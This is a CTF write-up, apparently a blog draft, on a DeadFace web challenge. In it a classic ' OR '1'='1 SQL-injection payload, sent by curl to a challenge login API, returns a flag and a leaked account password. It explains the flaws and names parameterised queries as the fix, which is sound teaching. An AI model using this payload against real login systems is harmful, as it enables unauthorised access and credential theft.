# A Textbook SQL Injection in a "Vibe-Coded" Portal

**Subtitle:** The UI said "Login failed." The raw API response said something very different.

Some bugs are interesting because they're subtle. This one is interesting because it's the opposite — it's the first SQL injection every web-security course teaches, sitting live in an app, with the flag handed back in the login response. "Doctor Appointment" was a 26-point **Web Security** challenge, and the lesson it drives home is that the browser UI is not the source of truth.

The target was Health Spark, a benefits portal with a `firstname.lastname` login scheme. The brief warned against brute forcing and pointed at the DeadFace forum for backstory (the crew had socially-engineered a nurse's credentials). The real opening, though, was sitting in the login page source.

## Reading the page source first

A developer comment on the login page basically narrated the vulnerability:

```javascript
// No session issued -- bad creds, or the SQLi disclosure (HTTP 200 with
// no token). Show the server's message; the response body may contain
// more than the UI chooses to display.
fetch('/api/login', { method:'POST', ... body: {username, password} })
```

Three things fall out of that: the login posts JSON to `/api/login`, there's a known SQL-injection "disclosure," and the raw response holds more than the page shows. That last point is the one worth internalising.

## The injection

A normal failed login returned a plain error. So I sent the classic authentication-bypass payload in the username field and read the raw response with curl instead of trusting the rendered page:

```bash
curl -s -X POST http://45.79.200.170:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"x"}'
```

The response:

```json
{"message":"Login failed. That's weird... check the network traffic!",
 "username":"john.smith","name":"John Smith","role":"user",
 "departmentid":10685,"password":"Locked_In_And_Ready",
 "flag":"deadface{typical_and_classic}"}
```

The injected `' OR '1'='1'` made the WHERE clause always true, and the endpoint serialised the matched database row — including a `flag` field — straight into the JSON body, even though the UI only ever printed "Login failed."

```
deadface{typical_and_classic}
```

## Why it works

Two separate mistakes stack here. First, the backend built its SQL query by concatenating user input, so `' OR '1'='1` broke out of the username string and forced a condition that's always true — textbook injection. Second, and arguably worse, the endpoint returned the entire matched row to the client regardless of what the front end chose to display, trusting the browser to hide sensitive fields like the password and the flag. The flag name, `typical_and_classic`, is the authors being honest about how ordinary the payload is.

Parameterised queries would have killed the first bug. Not serialising secret columns to the client would have killed the second.

## What I took from it

Read client-side source and comments before you touch anything — developers leak design details, endpoints, and sometimes the whole plan right there. Inspect raw API responses with curl or your browser's network tab, because the UI is a presentation layer, not a security boundary. And a small bonus I noted for later challenges in the series: the same response leaked a working account, `john.smith : Locked_In_And_Ready`, plus an admin endpoint referenced elsewhere in the dashboard source — the kind of foothold that chains into the next challenge.

---

**Medium excerpt:** The login page said "Login failed." The raw API response handed back the user's password and the flag. Here's a textbook SQL injection in a DeadFace CTF web challenge, and why the UI is never the source of truth.

**Tags:** Cybersecurity · Capture The Flag · Web Security · SQL Injection · Infosec

**Cover image concept:** A split frame — left side a plain "Login failed" browser toast, right side the raw JSON response with `flag` and `password` fields highlighted. Captures the "UI vs reality" idea exactly.
